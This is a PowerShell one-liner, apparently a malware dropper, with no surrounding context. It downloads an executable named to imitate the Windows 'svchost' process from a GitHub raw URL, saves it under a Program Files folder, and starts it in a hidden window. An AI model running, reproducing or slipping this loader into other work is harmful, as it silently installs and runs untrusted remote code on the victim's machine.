$url="https://raw.githubusercontent.com/requiemmmmmmm/reqq/main/scvhost.exe";$path="${env:ProgramFiles}\deluga";if(!(Test-Path $path)){New-Item -ItemType Directory -Path $path -Force|Out-Null};$file="$path\asd.exe";if(!(Test-Path $file)){(New-Object System.Net.WebClient).DownloadFile($url,$file)};if(!(Get-Process -Name "asd" -ErrorAction SilentlyContinue)){Start-Process -FilePath $file -WindowStyle Hidden}